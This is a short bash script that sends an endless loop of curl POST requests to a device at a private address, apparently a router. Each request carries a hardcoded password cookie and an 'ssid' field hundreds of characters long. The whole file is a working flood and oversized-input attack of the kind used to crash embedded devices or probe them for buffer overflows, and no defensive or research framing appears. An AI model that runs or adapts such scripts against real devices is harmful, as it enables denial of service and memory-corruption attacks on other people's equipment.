counter=0

# Infinite loop for sequential CURL requests
while true
do
    ((counter=counter+1))  # Increment the counter

    echo Making request $counter...
	# do curl -X POST 192.168.2.2 -H "Accept: */*" -H "Cookie: Cookie-password=12345" --data "ssid=taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" --header "Content-Type: application/x-www-form-urlencoded"
	curl -X POST 192.168.2.2 -H "Accept: */*" -H "User-Agent: python-requests/2.25.1" -H "Connection: keep-alive" -H "Accept-Encoding: gzip, deflate" -H "Cookie: Cookie-password=12345" --data "ssid=taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaataaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaataaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaataaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaestaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaataaaaaaaaaaaaaaaaaaaaaaaaa" --header "Content-Type: application/x-www-form-urlencoded" & wait
done
